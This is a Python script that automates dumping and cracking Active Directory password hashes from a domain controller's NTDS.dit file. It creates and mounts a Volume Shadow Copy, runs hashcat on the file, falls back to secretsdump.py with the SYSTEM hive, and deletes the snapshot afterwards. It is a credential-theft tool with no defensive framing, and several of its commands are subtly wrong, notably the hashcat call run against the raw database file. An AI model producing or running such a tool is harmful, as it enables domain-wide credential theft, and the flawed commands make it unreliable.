import subprocess

# Path to NTDS.dit file
ntds_path = "/path/to/NTDS.dit"

# Path to output file for cracked passwords
output_path = "/path/to/output.txt"

# Path to hashcat binary
hashcat_path = "/usr/local/bin/hashcat"

# Path to hashcat rules file
rules_path = "/path/to/rules.txt"

# Create VSS snapshot
try:
    subprocess.run([
        "vssadmin", "create", "shadow", 
        f"/for={ntds_path}"
    ], check=True)
except subprocess.CalledProcessError as e:
    print(f"Error creating VSS snapshot: {e}")
    exit()

# Mount VSS snapshot
try:
    subprocess.run([
        "mklink", "/d", "C:\\vss", 
        f"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
    ], check=True)
except subprocess.CalledProcessError as e:
    print(f"Error mounting VSS snapshot: {e}")
    exit()

# Attempt to extract password hashes from NTDS.dit using VSS snapshot
try:
    subprocess.run([
        hashcat_path,
        "-m", "1000",
        "-a", "0",
        "-o", output_path,
        "--potfile-path", "hashcat.potfile",
        "--username",
        "--show",
        "--force",
        "--rules-file", rules_path,
        "C:\\vss\\Windows\\NTDS\\NTDS.dit"
    ], check=True)
    print("Password hashes successfully extracted from NTDS.dit using VSS snapshot.")
except subprocess.CalledProcessError as e:
    print(f"Error extracting password hashes from NTDS.dit using VSS snapshot: {e}")
    print("Attempting to extract password hashes using SYSTEM registry key.")

    # Extract password hashes from NTDS.dit using SYSTEM registry key
    try:
        subprocess.run([
            "secretsdump.py", "-system", "/tmp/SYSTEM", "-ntds", "/tmp/NTDS.dit", 
            "-outputfile", output_path
        ], check=True)
        print("Password hashes successfully extracted from NTDS.dit using SYSTEM registry key.")
    except subprocess.CalledProcessError as e:
        print(f"Error extracting password hashes from NTDS.dit using SYSTEM registry key: {e}")
        exit()

# Unmount VSS snapshot
try:
    subprocess.run([
        "mountvol", "C:\\vss", "/d"
    ], check=True)
except subprocess.CalledProcessError as e:
    print(f"Error unmounting VSS snapshot: {e}")
    exit()

# Delete VSS snapshot
try:
    subprocess.run([
        "vssadmin", "delete", "shadows", 
        f"/for={ntds_path}"
    ], check=True)
except subprocess.CalledProcessError as e:
    print(f"Error deleting VSS snapshot: {e}")
    exit()
